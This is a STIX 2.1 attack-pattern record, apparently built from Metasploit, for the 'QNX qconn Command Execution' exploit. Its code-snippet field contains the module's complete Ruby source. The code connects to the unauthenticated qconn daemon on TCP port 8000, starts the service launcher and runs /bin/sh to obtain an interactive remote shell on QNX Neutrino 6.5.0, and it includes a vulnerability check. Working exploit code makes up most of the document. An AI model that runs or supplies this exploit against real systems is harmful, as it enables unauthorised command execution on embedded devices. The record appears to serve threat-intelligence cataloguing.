{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--81dd43ff-69f0-457c-b43c-9f6ffc5abd17",
    "created": "2024-08-14T16:56:57.539595Z",
    "modified": "2024-08-14T16:56:57.539599Z",
    "name": "QNX qconn Command Execution",
    "description": " This module uses the qconn daemon on QNX systems to gain a shell.  The QNX qconn daemon does not require authentication and allows remote users to execute arbitrary operating system commands.  This module has been tested successfully on QNX Neutrino 6.5.0 (x86) and 6.5.0 SP1 (x86).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/qnx/qconn/qconn_exec.rb",
            "external_id": "qconn_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.optiv.com/blog/pentesting-qnx-neutrino-rtos"
        },
        {
            "source_name": "reference",
            "url": "http://www.qnx.com/developers/docs/6.5.0SP1/neutrino/utilities/q/qconn.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.qnx.com/developers/docs/6.5.0/topic/com.qnx.doc.neutrino_utilities/q/qconn.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'QNX qconn Command Execution',\n        'Description' => %q{\n          This module uses the qconn daemon on QNX systems to gain a shell.\n\n          The QNX qconn daemon does not require authentication and allows\n          remote users to execute arbitrary operating system commands.\n\n          This module has been tested successfully on QNX Neutrino 6.5.0 (x86)\n          and 6.5.0 SP1 (x86).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'David Odell', # Discovery\n          'Mor!p3r', # PoC\n          'bcoles' # Metasploit\n        ],\n        'References' => [\n          ['EDB', '21520'],\n          ['URL', 'https://www.optiv.com/blog/pentesting-qnx-neutrino-rtos'],\n          ['URL', 'http://www.qnx.com/developers/docs/6.5.0SP1/neutrino/utilities/q/qconn.html'],\n          ['URL', 'http://www.qnx.com/developers/docs/6.5.0/topic/com.qnx.doc.neutrino_utilities/q/qconn.html']\n        ],\n        'Payload' => {\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat' => {\n            'PayloadType' => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n        'DefaultOptions' => {\n          'WfsDelay' => 10,\n          'PAYLOAD' => 'cmd/unix/interact'\n        },\n        'Platform' => 'unix', # QNX Neutrino\n        'Arch' => ARCH_CMD,\n        'Targets' => [['Automatic', {}]],\n        'Privileged' => false,\n        'DisclosureDate' => '2012-09-04',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('SHELL', [true, 'Path to system shell', '/bin/sh'])\n      ]\n    )\n  end\n\n  def check\n    vprint_status('Sending check...')\n\n    connect\n    res = sock.get_once(-1, 10)\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    return CheckCode::Safe unless res.include?('QCONN')\n\n    sock.put(\"service launcher\\n\")\n    res = sock.get_once(-1, 10)\n\n    return CheckCode::Safe unless res.to_s.include?('OK')\n\n    fingerprint = Rex::Text.rand_text_alphanumeric(5..10)\n    sock.put(\"start/flags run /bin/echo /bin/echo #{fingerprint}\\n\")\n\n    return CheckCode::Safe unless res.to_s.include?('OK')\n\n    Rex.sleep(1)\n\n    res = sock.get_once(-1, 10)\n\n    return CheckCode::Safe unless res.to_s.include?(fingerprint)\n\n    disconnect\n\n    CheckCode::Vulnerable\n  end\n\n  def exploit\n    connect\n    res = sock.get_once(-1, 10)\n\n    fail_with(Failure::Unreachable, 'Connection failed') unless res\n\n    fail_with(Failure::UnexpectedReply, 'Unexpected reply') unless res.include?('QCONN')\n\n    sock.put(\"service launcher\\n\")\n    res = sock.get_once(-1, 10)\n\n    fail_with(Failure::UnexpectedReply, 'Unexpected reply') unless res.to_s.include?('OK')\n\n    print_status('Sending payload...')\n    sock.put(\"start/flags run #{datastore['SHELL']} -\\n\")\n\n    Rex.sleep(1)\n\n    fail_with(Failure::UnexpectedReply, 'Shell negotiation failed. Unexpected reply.') unless negotiate_shell(sock)\n\n    print_good('Payload sent successfully')\n\n    handler\n  end\n\n  def negotiate_shell(sock)\n    Timeout.timeout(15) do\n      loop do\n        data = sock.get_once(-1, 10)\n\n        return if data.blank?\n\n        if data.include?('#') || data.include?('No controlling tty')\n          return true\n        end\n\n        Rex.sleep(0.5)\n      end\n    end\n  rescue ::Timeout::Error\n    return nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-09-04",
    "x_mitre_platforms": [
        "unix', # QNX Neutrino"
    ]
}